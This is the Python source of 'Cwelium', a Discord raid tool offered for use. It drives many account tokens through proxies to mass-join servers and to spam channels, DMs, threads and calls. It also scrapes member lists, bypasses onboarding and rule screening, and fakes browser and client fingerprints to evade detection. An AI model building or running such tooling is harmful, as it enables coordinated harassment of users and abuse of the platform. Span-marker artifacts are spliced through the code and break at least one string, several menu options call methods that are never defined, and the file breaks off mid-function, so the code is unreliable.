# Copyright (c) 2024-2025 Cwelium Inc.
# This project is licensed under the Cwelium License, which includes additional
# terms under the GNU Affero General Public License (AGPL) v3.0.
#
# Author: Tips-Discord
# Original Repository: https://github.com/Tips-Discord/Cwelium
#
# Additional Terms can be found at:
# https://github.com/Tips-Discord/Cwelium/blob/main/LICENSE

#from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, init; init(autoreset=True)
from colorist import ColorHex as h
from datetime import datetime
import base64
import ctypes
import json
import os
import random
import re
import requests
import string
import threading
import time
import tls_client
import uuid
import websocket

session = tls_client.Session(client_identifier="chrome_138", random_tls_extension_order=True, ja3_string="771,4865-4866-4867,0-11-10-43-35-51-13-45-23-18-16-27-5-65281-28-25-17513,29-23-24,0", h2_settings={"HEADER_TABLE_SIZE":65536,"ENABLE_PUSH":0,"INITIAL_WINDOW_SIZE":6291456,"MAX_HEADER_LIST_SIZE":262144}, h2_settings_order=["HEADER_TABLE_SIZE","ENABLE_PUSH","INITIAL_WINDOW_SIZE","MAX_HEADER_LIST_SIZE"], supported_signature_algorithms=["ecdsa_secp256r1_sha256","rsa_pss_rsae_sha256","rsa_pkcs1_sha256","ecdsa_secp384r1_sha384","rsa_pss_rsae_sha384","rsa_pkcs1_sha384","rsa_pss_rsae_sha512","rsa_pkcs1_sha512"], supported_versions=["TLS_1_3","TLS_1_2"], key_share_curves=["GREASE","X25519","secp256r1","secp384r1"], pseudo_header_order=[":method",":authority",":scheme",":path"], connection_flow=15663105, priority_frames=[])[span_0](start_span)[span_0](end_span)

def get_random_str(length):
    return "".join(random.choice(string.ascii_letters + string.digits) for _ in range(length))[span_1](start_span)[span_1](end_span)

def wrapper(func):
    def wrapper(*args, **kwargs):
        console.clear()
        console.render_ascii()
        result = func(*args, **kwargs)
        return result
    return wrapper[span_2](start_span)[span_2](end_span)

C = {
    "green": h("#65fb07"),
    "red": h("#Fb0707"),
    "yellow": h("#FFCD00"),
    "magenta": h("#b207f5"),
    "blue": h("#00aaff"),
    "cyan": h("#aaffff"),
    "gray": h("#8a837e"),
    "white": h("#DCDCDC"),
    "pink": h("#c203fc"),
    "light_blue": h("#07f0ec"),
    "brown": h("#8B4513"),
    "black": h("#000000"),
    "aqua": h("#00CED1"),
    "purple": h("#800080"),
    "lime": h("#00FF00"),
    "orange": h("#FFA500"),
    "indigo": h("#4B0082"),
    "violet": h("#EE82EE"),
    "gold": h("#FFD700"),
    "silver": h("#C0C0C0"),
    "teal": h("#008080"),
    "navy": h("#000080"),
    "olive": h("#808000"),
    "maroon": h("#800000"),
    "coral": h("#FF7F50"),
    "salmon": h("#FA8072"),
    "khaki": h("#F0E68C"),
    "orchid": h("#DA70D6"),
    "rose": h("#FF007F")
}[span_3](start_span)[span_3](end_span)

class Files:
    @staticmethod
    def write_config():
        try:
            if not os.path.exists("config.json"):
                data = {
                    "Proxies": False,
                    "Theme": "light_blue", 
                }
                with open("config.json", "w") as f:
                    json.dump(data, f, indent=4)
        except Exception as e:
            console.log("FAILED", C["red"], "Failed to Write Config", e)

    @staticmethod
    def write_folders():
        folders = ["data", "scraped"]
        for folder in folders:
            try:
                if not os.path.exists(folder):
                    os.mkdir(folder)
            except Exception as e:
                console.log("FAILED", C["red"], "Failed to Write Folders", e)

    @staticmethod
    def write_files():
        files = ["tokens.txt", "proxies.txt"]
        for file in files:
            try:
                if not os.path.exists(file):
                    with open(f"data/{file}", "a") as f:
                        f.close()
            except Exception as e:
                console.log("FAILED", C["red"], "Failed to Write Files", e)

    @staticmethod
    def run_tasks():
        tasks = [Files.write_config, Files.write_folders, Files.write_files]
        for task in tasks:
            task()[span_4](start_span)[span_4](end_span)

Files.run_tasks()[span_5](start_span)[span_5](end_span)

with open("data/proxies.txt") as f:
    proxies = f.read().splitlines()[span_6](start_span)[span_6](end_span)

with open("config.json") as f:
    Config = json.load(f)[span_7](start_span)[span_7](end_span)

with open("data/tokens.txt", "r") as f:
    tokens = f.read().splitlines()[span_8](start_span)[span_8](end_span)
    
proxy = Config["Proxies"][span_9](start_span)[span_9](end_span)
color = Config["Theme"][span_10](start_span)[span_10](end_span)

class Render:
    def __init__(self):
        try:
            self.size = os.get_terminal_size().columns
        except (AttributeError, OSError):
            self.size = 80
        self.print_lock = threading.Lock()
        if not color:
            self.background = C["light_blue"]
        else:
            self.background = C[color][span_11](start_span)[span_11](end_span)

    def title(self, title):
        try:
            ctypes.windll.kernel32.SetConsoleTitleW(title)
        except (AttributeError, OSError):
            pass[span_12](start_span)[span_12](end_span)

    def clear(self):
        os.system("cls")[span_13](start_span)[span_13](end_span)
        
    def render_ascii(self):
        self.clear()
        try:
            current_user = os.getlogin()
        except (AttributeError, OSError):
            current_user = "Server"
        self.title(f"Cwelium | Connected as {current_user} | made by Tips-Discord")
        edges = ["╗", "║", "╚", "╝", "═", "╔"]
        ascii = f"""
{' ██████╗██╗    ██╗███████╗██╗     ██╗██╗   ██╗███╗   ███╗'.center(self.size)}
{'██╔════╝██║    ██║██╔════╝██║     ██║██║   ██║████╗ ████║'.center(self.size)}
{'██║     ██║ █╗ ██║█████╗  ██║     ██║██║   ██║██╔████╔██║'.center(self.size)}
{'██║     ██║███╗██║██╔══╝  ██║     ██║██║   ██║██║╚██╔╝██║'.center(self.size)}
{'╚██████╗╚███╔███╔╝███████╗███████╗██║╚██████╔╝██║ ╚═╝ ██║'.center(self.size)}
{' ╚═════╝ ╚══╝╚══╝ ╚══════╝╚══════╝╚═╝ ╚═════╝ ╚═╝     ╚═╝'.center(self.size)}
{''.center(self.size)}
""[span_14](start_span)"[span_14](end_span)
        
        for line in ascii.splitlines():
            for edge in edges:
                line = line.replace(edge, f"{self.background}{edge}{C['white']}")
            print(line)[span_15](start_span)[span_15](end_span)

    def raider_options(self):
        with open("data/proxies.txt") as f:
            global proxies
            proxies = f.read().splitlines()
        with open("data/tokens.txt", "r") as f:
            global tokens
            tokens = f.read().splitlines()

        edges = ["─", "╭", "│", "╰", "╯", "╮", "»", "«"]
        title = f"""{Fore.RESET}{' ' * max(0, (self.size - len(f'Loaded ‹{len(tokens)}› tokens | Loaded ‹{len(proxies)}› proxies')) // 2)}Loaded ‹{self.background}{len(tokens)}{Fore.RESET}› tokens | Loaded ‹{self.background}{len(proxies)}{Fore.RESET}› proxies

{'╭─────────────────────────────────────────────────────────────────────────────────────────────╮'.center(self.size)}
{'│ «01» Joiner            «07» Token Formatter    «13» Onliner           «19» Call Spammer     │'.center(self.size)}
{'│ «02» Leaver            «08» Button Click       «14» Voice Raper       «20» Bio Change       │'.center(self.size)}
{'│ «03» Spammer           «09» Accept Rules       «15» Change Nick       «21» Voice Joiner     │'.center(self.size)}
{'│ «04» Token Checker     «10» Guild Check        «16» Thread Spammer    «22» Onboard Bypass   │'.center(self.size)}
{'│ «05» Emoji Reaction    «11» Friend Spam        «17» Typer             «23» Dm Spammer       │'.center(self.size)}
{'│ «06» ???               «12» ???                «18» ???               «24» Exit             │'.center(self.size)}
{'╰─────────────────────────────────────────────────────────────────────────────────────────────╯'.center(self.size)}
{'«~» Credits'.center(self.size)}
""[span_16](start_span)"[span_16](end_span)
        for edge in edges:
            title = title.replace(edge, f"{self.background}{edge}{C['white']}")
        print(title)[span_17](start_span)[span_17](end_span)

    def run(self):
        options = [self.render_ascii(), self.raider_options()]
        ([option] for option in options)[span_18](start_span)[span_18](end_span)

    def log(self, text=None, color=None, token=None, log=None):
        response = f"{Fore.RESET}[{datetime.now().strftime(f'{Fore.LIGHTBLACK_EX}%H:%M:%S{Fore.RESET}')}] "
        if text:
            response += f"[{color}{text}{C['white']}] "
        if token:
            response += token
        if log:
            response += f" ({C['gray']}{log}{C['white']})"
        with self.print_lock:
            print(response)[span_19](start_span)[span_19](end_span)

    def prompt(self, text, ask=None):
        prompted = f"[{C[color]}{text}{C['white']}]"
        if ask:
            prompted += f" {C['gray']}(y/n){C['white']}: "
        else:
            prompted += ": "
            
        return prompted[span_20](start_span)[span_20](end_span)

console = Render()[span_21](start_span)[span_21](end_span)

# Big Thanks to Aniell4 for the scraper
class Utils:
    @staticmethod
    def range_corrector(ranges):
        if [0, 99] not in ranges:
            ranges.insert(0, [0, 99])
        return ranges[span_22](start_span)[span_22](end_span)

    @staticmethod
    def get_ranges(index, multiplier, member_count):
        initial_num = index * multiplier
        ranges = [[initial_num, initial_num + 99]]
        if member_count > initial_num + 99:
            ranges.append([initial_num + 100, initial_num + 199])
        return Utils.range_corrector(ranges)[span_23](start_span)[span_23](end_span)

    @staticmethod
    def parse_member_list_update(response):
        data = response["d"]
        member_data = {
            "online_count": data["online_count"],
            "member_count": data["member_count"],
            "id": data["id"],
            "guild_id": data["guild_id"],
            "hoisted_roles": data["groups"],
            "types": [op["op"] for op in data["ops"]],
            "locations": [],
            "updates": [],
        }

        for chunk in data["ops"]:
            op_type = chunk["op"]
            if op_type in {"SYNC", "INVALIDATE"}:
                member_data["locations"].append(chunk["range"])
                member_data["updates"].append(chunk["items"] if op_type == "SYNC" else [])
            elif op_type in {"INSERT", "UPDATE", "DELETE"}:
                member_data["locations"].append(chunk["index"])
                member_data["updates"].append(chunk["item"] if op_type != "DELETE" else [])

        return member_data[span_24](start_span)[span_24](end_span)

class DiscordSocket(websocket.WebSocketApp):
    def __init__(self, token, guild_id, channel_id):
        self.token = token
        self.guild_id = guild_id
        self.channel_id = channel_id
        self.blacklisted_ids = {"1100342265303547924", "1190052987477958806", "833007032000446505", "1273658880039190581", "1308012310396407828", "1326906424873193586", "1334512667456442411", "1349869929809186846"}

        headers = {
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
            "Sec-WebSocket-Extensions": "permessage-deflate; client_max_window_bits",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        }

        super().__init__(
            "wss://gateway.discord.gg/?encoding=json&v=9",
            header=headers,
            on_open=self.on_open,
            on_message=self.on_message,
            on_close=self.on_close,
        )

        self.end_scraping = False
        self.guilds = {}
        self.members = {}
        self.ranges = [[0, 0]]
        self.last_range = 0
        self.packets_recv = 0[span_25](start_span)[span_25](end_span)

    def run(self):
        self.run_forever()
        return self.members[span_26](start_span)[span_26](end_span)

    def scrape_users(self):
        if not self.end_scraping:
            self.send(json.dumps({
                "op": 14,
                "d": {
                    "guild_id": self.guild_id,
                    "typing": True,
                    "activities": True,
                    "threads": True,
                    "channels": {self.channel_id: self.ranges}
                }
            }))[span_27](start_span)[span_27](end_span)

    def on_open(self, ws):
        self.send(json.dumps({
            "op": 2,
            "d": {
                "token": self.token,
                "capabilities": 125,
                "properties": {
                    "os": "Windows",
                    "browser": "Chrome",
                    "device": "",
                    "system_locale": "it-IT",
                    "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
                    "browser_version": "131.0.0.0",
                    "os_version": "10",
                    "referrer": "",
                    "referring_domain": "",
                    "referrer_current": "",
                    "referring_domain_current": "",
                    "release_channel": "stable",
                    "client_build_number": 355624,
                    "client_event_source": None
                },
                "presence": {
                    "status": "online",
                    "since": 0,
                    "activities": [],
                    "afk": False
                },
                "compress": False,
                "client_state": {
                    "guild_hashes": {},
                    "highest_last_message_id": "0",
                    "read_state_version": 0,
                    "user_guild_settings_version": -1,
                    "user_settings_version": -1
                }
            }
        }))[span_28](start_span)[span_28](end_span)

    def heartbeat_thread(self, interval):
        while not self.end_scraping:
            self.send(json.dumps({"op": 1, "d": self.packets_recv}))
            time.sleep(interval)[span_29](start_span)[span_29](end_span)

    def on_message(self, ws, message):
        decoded = json.loads(message)
        if not decoded:
            return

        self.packets_recv += decoded["op"] != 11

        if decoded["op"] == 10:
            threading.Thread(
                target=self.heartbeat_thread,
                args=(decoded["d"]["heartbeat_interval"] / 1000,),
                daemon=True,
            ).start()

        if decoded["t"] == "READY":
            self.guilds.update({guild["id"]: {"member_count": guild["member_count"]} for guild in decoded["d"]["guilds"]})

        if decoded["t"] == "READY_SUPPLEMENTAL":
            self.ranges = Utils.get_ranges(0, 100, self.guilds[self.guild_id]["member_count"])
            self.scrape_users()

        elif decoded["t"] == "GUILD_MEMBER_LIST_UPDATE":
            parsed = Utils.parse_member_list_update(decoded)
            if parsed["guild_id"] == self.guild_id:
                self.process_updates(parsed)[span_30](start_span)[span_30](end_span)

    def process_updates(self, parsed):
        if "SYNC" in parsed["types"] or "UPDATE" in parsed["types"]:
            for i, update_type in enumerate(parsed["types"]):
                if update_type in {"SYNC", "UPDATE"}:
                    if not parsed["updates"][i]:
                        self.end_scraping = True
                        break
                    self.process_members(parsed["updates"][i])

                self.last_range += 1
                self.ranges = Utils.get_ranges(self.last_range, 100, self.guilds[self.guild_id]["member_count"])
                time.sleep(0.65)
                self.scrape_users()

        if self.end_scraping:
            self.close()[span_31](start_span)[span_31](end_span)

    def process_members(self, updates):
        for item in updates:
            member = item.get("member")
            if member:
                user = member.get("user", {})
                user_id = user.get("id")
                if user_id and user_id not in self.blacklisted_ids and not user.get("bot"):
                    self.members[user_id] = {
                        "tag": f"{user.get('username')}#{user.get('discriminator')}",
                        "id": user_id,
                    }[span_32](start_span)[span_32](end_span)

    def on_close(self, ws, close_code, close_msg):
        console.log("Success", C["green"], False, f"scraped {len(self.members)} members")[span_33](start_span)[span_33](end_span)

def scrape(token, guild_id, channel_id):
    sb = DiscordSocket(token, guild_id, channel_id)
    return sb.run()[span_34](start_span)[span_34](end_span)
    
class Raider:
    def __init__(self):
        self.cookies, self.fingerprint = self.get_discord_cookies()
        self.ws = websocket.WebSocket()[span_35](start_span)[span_35](end_span)

    def get_discord_cookies(self):
        try:
            response = requests.get(
                'https://discord.com/api/v9/experiments',
            )
            match response.status_code:
                case 200:
                    return "; ".join(
                        [f"{cookie.name}={cookie.value}" for cookie in response.cookies]
                    ) + "; locale=en-US", response.json()["fingerprint"]
                case _:
                    console.log("ERROR", C["red"], "Failed to get cookies using Static")
                    return "__dcfduid=62f9e16000a211ef8089eda5bffbf7f9; __sdcfduid=62f9e16100a211ef8089eda5bffbf7f98e904ba04346eacdf57ee4af97bdd94e4c16f7df1db5132bea9132dd26b21a2a; __cfruid=a2ccd7637937e6a41e6888bdb6e8225cd0a6f8e0-1714045775; _cfuvid=s_CLUzmUvmiXyXPSv91CzlxP00pxRJpqEhuUgJql85Y-1714045775095-0.0.1.1-604800000; locale=en-US"
        except Exception as e:
            console.log("ERROR", C["red"], "get_discord_cookies", e)[span_36](start_span)[span_36](end_span)

    def super_properties(self):
        try:
            payload = {
                "os": "Windows",
                "browser": "Discord Client",
                "release_channel": "stable",
                "client_version": "1.0.9199",
                "os_version": "10.0.19045",
                "system_locale": "pl",
                "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9199 Chrome/134.0.6998.205 Electron/35.3.0 Safari/537.36",
                "browser_version": "35.3.0",
                "client_build_number": random.randint(416613, 427000),
                "native_build_number": 65941,
                "client_launch_id": str(uuid.uuid4()),
                "client_heartbeat_session_id": str(uuid.uuid4()),
                "client_event_source": None,
            }
            properties = base64.b64encode(json.dumps(payload).encode()).decode()
            return properties
        except Exception as e:
            console.log("ERROR", C["red"], "get_super_properties", e)[span_37](start_span)[span_37](end_span)

    def headers(self, token):
        return {
            "authority": "discord.com",
            "accept": "*/*",
            "accept-language": "en",
            "authorization": token,
            "cookie": self.cookies,
            "content-type": "application/json",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9199 Chrome/134.0.6998.205 Electron/35.3.0 Safari/537.366",
            "x-discord-locale": "en-US",
            "x-debug-options": "bugReporterEnabled",
            "x-fingerprint": self.fingerprint,
            "x-super-properties": self.super_properties
        }

    def accept_rules(self, guild_id):
        try:
            with open("data/tokens.txt", "r") as f:
                tokens = f.read().splitlines()

            valid = []
                
            for token in tokens:
                value = session.get(
                    f"https://discord.com/api/v9/guilds/{guild_id}/member-verification",
                    headers=self.headers(token)
                )

                match value.status_code:
                    case 200:
                        valid.append(token)
                        payload = value.json()
                        break

            if not valid:
                console.log("FAILED", C["red"], "All tokens are Invalid")
                input()
                Menu().main_menu()

        except Exception as e:
            console.log("FAILED", C["red"], "Failed to Accept Rules", e)

        def run_main(token):
            try:
                response = session.put(
                    f"https://discord.com/api/v9/guilds/{guild_id}/requests/@me",
                    headers=self.headers(token),
                    json=payload
                )
                
                match response.status_code:
                    case 201:
                        console.log("ACCEPTED", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", guild_id)
                    case _:
                        console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
            except Exception as e:
                console.log("FAILED", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

        with open("data/tokens.txt", "r") as f:
            tokens = f.read().splitlines()

        args = [
            (token, ) for token in tokens
        ]
        Menu().run(run_main, args)

    def guild_checker(self, guild_id):
        in_guild = []
        def main_checker(token):
            try:
                while True:
                    response = session.get(
                        f"https://discord.com/api/v9/guilds/{guild_id}",
                        headers=self.headers(token)
                    )

                    match response.status_code:
                        case 200:
                            console.log("Found", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", guild_id)
                            in_guild.append(token)
                            break
                        case 429:
                            retry_after = response.json()["retry_after"] + random.uniform(0.1, 0.5)
                            console.log("RATELIMIT", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Ratelimit Exceeded - {retry_after:.2f}s",)
                            time.sleep(float(retry_after))
                        case _:
                            console.log("Not Found", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", guild_id)
                            break
            except Exception as e:
                console.log("FAILED", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

        with open("data/tokens.txt", "r") as f:
            tokens = f.read().splitlines()

        args = [
            (token, ) for token in tokens
        ]
        Menu().run(main_checker, args)

    def bio_changer(self, token, bio):
        try:
            payload = {
                "bio": bio
            }

            while True:
                response = session.patch(
                    "https://discord.com/api/v9/users/@me/profile",
                    headers=self.headers(token),
                    json=payload
                )

                match response.status_code:
                    case 200:
                        console.log("Changed", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", bio)
                        break
                    case 429:
                        retry_after = response.json()["retry_after"] + random.uniform(0.1, 0.5)
                        console.log("RATELIMIT", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Ratelimit Exceeded - {retry_after:.2f}s",)
                        time.sleep(float(retry_after))
                    case _:
                        console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
                        break
        except Exception as e:
            console.log("FAILED", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def mass_nick(self, token, guild, nick):
        try:
            payload = {
                "nick" : nick
            }

            while True:
                response = session.patch(
                    f"https://discord.com/api/v9/guilds/{guild}/members/@me", 
                    headers=self.headers(token),
                    json=payload
                )

                match response.status_code:
                    case 200:
                        console.log("SUCCESS", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                        break
                    case 429:
                        retry_after = response.json()["retry_after"] + random.uniform(0.1, 0.5)
                        console.log("RATELIMIT", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Ratelimit Exceeded - {retry_after:.2f}s",)
                        time.sleep(float(retry_after))
                    case _:
                        console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
                        break
        except Exception as e:
            console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def thread_spammer(self, token, channel_id, name):
        try:
            payload = {
                "name": name,
                "type": 11,
                "auto_archive_duration": 4320,
                "location": "Thread Browser Toolbar",
            }

            while True:
                response = session.post(
                    f"https://discord.com/api/v9/channels/{channel_id}/threads",
                    headers=self.headers(token),
                    json=payload
                )

                match response.status_code:
                    case 201:
                        console.log("CREATED", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", name)
                    case 429:
                        retry_after = response.json()["retry_after"] + random.uniform(0.1, 0.5)
                        if int(retry_after) > 10:
                            console.log("STOPPED", C["magenta"], token[:25], f"Ratelimit Exceeded - {int(round(retry_after))}s",)
                            break
                        else:
                            console.log("RATELIMIT", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Ratelimit Exceeded - {retry_after:.2f}s",)
                            time.sleep(float(retry_after))
                    case _:
                        console.log("FAILED", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
                        break
        except Exception as e:
            console.log("FAILED", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def typier(self, token, channelid):
        try:
            while True:
                response = session.post(
                    f"https://discord.com/api/v9/channels/{channelid}/typing", 
                    headers=self.headers(token)
                )

                match response.status_code: 
                    case 204:
                        console.log("SUCCESS", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                        time.sleep(9)
                    case 429:
                        retry_after = response.json()["retry_after"] + random.uniform(0.1, 0.5)
                        console.log("RATELIMIT", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", f"Ratelimit Exceeded - {retry_after:.2f}s",)
                        time.sleep(float(retry_after))
                    case _:
                        console.log("FAILED", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                        break
        except Exception as e:
            console.log("FAILED", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def friender(self, token, nickname):
        try:
            payload = {
                "username": nickname,
                "discriminator": None,
            }

            response = session.post(
                f"https://discord.com/api/v9/users/@me/relationships", 
                headers=self.headers(token), 
                json=payload
            )

            match response.status_code:
                case 204:
                    console.log(f"SUCCESS", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                case 400:
                    console.log("CAPTCHA", C["yellow"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                case _:
                    console.log("Failed", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json())
        except Exception as e:
            console.log("FAILED", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

    def onboard_bypass(self, guild_id):
        try:
            with open("data/tokens.txt", "r") as f:
                tokens = f.read().splitlines()

            onboarding_responses_seen = {}
            onboarding_prompts_seen = {}
            onboarding_responses = []
            in_guild = []

            for _token in tokens:
                response = session.get(
                    f"https://discord.com/api/v9/guilds/{guild_id}/onboarding",
                    headers=self.headers(_token)
                )

                match response.status_code:
                    case 200:
                        in_guild.append(_token)
                        break

            if not in_guild:
                console.log("FAILED", C["red"], "Missing Access")
                input()
                Menu().main_menu()
            else:
                data = response.json()
                now = int(datetime.now().timestamp())

                for __ in data["prompts"]:
                    onboarding_responses.append(__["options"][-1]["id"])

                    onboarding_prompts_seen[__["id"]] = now

                    for prompt in __["options"]:
                        if prompt:
                            onboarding_responses_seen[prompt["id"]] = now
                        else:
                            console.log(
                                "FAILED",
                                C["red"],
                                "No onboarding in This Server",
                            )
                            input()
                            Menu().main_menu()

        except Exception as e:
            console.log("FAILED", C["red"], "Failed to Pass Onboard", e)
            input()
            Menu().main_menu()

        def run_task(token):
            try:
                json_data = {
                    "onboarding_responses": onboarding_responses,
                    "onboarding_prompts_seen": onboarding_prompts_seen,
                    "onboarding_responses_seen": onboarding_responses_seen,
                }

                response = session.post(
                    f"https://discord.com/api/v9/guilds/{guild_id}/onboarding-responses",
                    headers=self.headers(token),
                    json=json_data
                )

                match response.status_code:
                    case 200:
                        console.log("ACCEPTED", C["green"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**")
                    case _:
                        console.log("FAILED", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", response.json().get("message"))
            except Exception as e:
                console.log("FAILED", C["red"], f"{Fore.RESET}{token[:25]}.{Fore.LIGHTCYAN_EX}**", e)

        args = [
            (token, ) for token in tokens
        ]
        Menu().run(run_task, args)

class Menu:
    def __init__(self):
        if not color:
            self.background = C["light_blue"]
        else:
            self.background = C[color]
            
        self.raider = Raider()
        self.options = {
            "1": self.joiner, 
            "2": self.leaver,
            "3": self.spammer, 
            "4": self.checker,
            "5": self.reactor, 
            "7": self.formatter,
            "8": self.button,
            "9": self.accept,
            "10": self.guild,
            "11": self.friender,
            "13": self.onliner,
            "14": self.soundbord,
            "15": self.nick_changer,
            "16": self.Thread_Spammer,
            "17": self.typier,
            "19": self.caller,
            "20": self.bio_changer,
            "21": self.voice_joiner,
            "22": self.onboard,
            "23": self.dm_spam,
            "24": self.exits,
            "~": self.credit,
        }

    def main_menu(self):
        console.run()

        choice = input(f"{' '*6}{self.background}-> {Fore.RESET}")

        if choice.startswith('0') and len(choice) == 2:
            choice = str(int(choice))

        if choice.lower() in self.options:
            console.render_ascii()
            self.options[choice.lower()]()
        else:
            self.main_menu()

    def run(self, func, args):
        threads = []
        console.clear()
        console.render_ascii()

        for idx, arg in enumerate(args):
            if proxy and proxies:
                selected_proxy = proxies[idx % len(proxies)]
                session.proxies = {
                    "http": f"http://{selected_proxy}",
                    "https": f"http://{selected_proxy}"
                }
            else:
                session.proxies = {} 
            thread = threading.Thread(target=func, args=arg, daemon=True)
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

        input(f"\n   {self.background}~/> press enter to continue ")
        self.main_menu()

    @wrapper
    def dm_spam(self):
        console.title(f"Cwelium - Dm Spammer")
        user_id = input(console.prompt("User ID"))
        if user_id == "":
            self.main_menu()

        message = input(console.prompt("Message"))
        if message == "":
            self.main_menu()

        console.clear()
        console.render_ascii()
        for token in tokens:
            threading.Thread(target=self.raider.dm_spammer, args=(token, user_id, message)).start()

    @wrapper
    def soundbord(self):
        console.title(f"Cwelium - Soundboard Spam")
        Link = input(console.prompt("Channel LINK"))
        if Link == "" or not Link.startswith("https://"):
            self.main_menu()
            
        channel = Link.split("/")[5]
        guild = Link.split("/")[4]

        console.clear()
        console.render_ascii()
        for token in tokens:
            threading.Thread(target=self.raider.vc_joiner, args=(token, guild, channel, websocket.WebSocket())).start()
            threading.Thread(target=self.raider.soundbord, args=(token, channel)).start()

    @wrapper
    def friender(self):
        console.title(f"Cwelium - Friender")
        nickname = input(console.prompt("Nick"))
        if nickname == "":
            self.main_menu()

        args = [
            (token, nickname) for token in tokens
        ]
        self.run(self.raider.friender, args)

    @wrapper
    def caller(self):
        console.title(f"Cwelium - Caller")
        user_id = input(console.prompt("User ID"))
        if user_id == "":
            self.main_menu()

        console.clear()
        console.render_ascii()
        for token in tokens:
            threading.Thread(target=self.raider.call_spammer, args=(token, user_id)).start()

    def onliner(self):
        console.title(f"Cwelium - Onliner")
        args = [
            (token, websocket.WebSocket()) for token in tokens
        ]
        self.run(self.raider.onliner, args)

    @wrapper
    def typier(self):
        console.title(f"Cwelium - Typer")
        Link = input(console.prompt(f"Channel LINK"))
        if Link == "" or not Link.startswith("https://"):
            self.main_menu()

        channelid = Link.split("/")[5]
        args = [
            (token, channelid) for token in tokens
        ]
        self.run(self.raider.typier, args)

    @wrapper
    def nick_changer(self):
        console.title(f"Cwelium - Nickname Changer")
        nick = input(console.prompt("Nick"))
        if nick == "":
            self.main_menu()

        guild = input(console.prompt("Guild ID"))
        if guild == "":
            self.main_menu()

        args = [
            (token, guild, nick) for token in tokens
        ]
        self.run(self.raider.mass_nick, args)

    @wrapper
    def voice_joiner(self):
        console.title(f"Cwelium - Voice Joiner")
        Link = input(console.prompt("Channel LINK"))
        if Link == "" or not Link.startswith("https://"):
            self.main_menu()

        guild = Link.split("/")[4]
        channel = Link.split("/")[5]
        args = [
            (token, guild, channel, websocket.WebSocket()) for token in tokens
        ]
        self.run(self.raider.vc_joiner, args)

    @wrapper
    def Thread_Spammer(self):
        console.title(f"Cwelium - Thread Spammer")
        Link = input(console.prompt("Channel LINK"))
        if Link == "" or not Link.startswith("https://"):
            self.main_menu()

        name = input(console.prompt("Name"))
        if name == "":
            self.main_menu()

        channel_id = Link.split("/")[5]
        args = [
            (token, channel_id, name) for token in tokens
        ]
        self.run(self.raider.thread_spammer, args)

    @wrapper
    def joiner(self):
        console.title(f"Cwelium - Joiner")
        invite = input(console.prompt(f"Invite"))
        if invite == "":
            self.main_menu()

        invite = re.sub(r"(https?://)?(www\.)?(discord\.(gg|com)/(invite/)?|\.gg/)", "", invite)

        args = [
            (token, invite) for token in tokens
        ]
        self.run(self.raider.joiner, args)

    @wrapper 
    def leaver(self):
        console.title(f"Cwelium - Leaver")
        guild = input(console.prompt("Guild ID"))
        if guild == "":
            self.main_menu()

        args = [
            (token, guild) for token in tokens
        ]
        self.run(self.raider.leaver, args)

    @wrapper
    def spammer(self):
        console.title(f"Cwelium - Spammer")
        Link = input(console.prompt(f"Channel LINK"))
        if Link == "" or not Link.startswith("https://"):
            self.main_menu()

        guild_id = Link.split("/")[4]
        channel_id = Link.split("/")[5]

        massping = input(console.prompt("Massping", True))
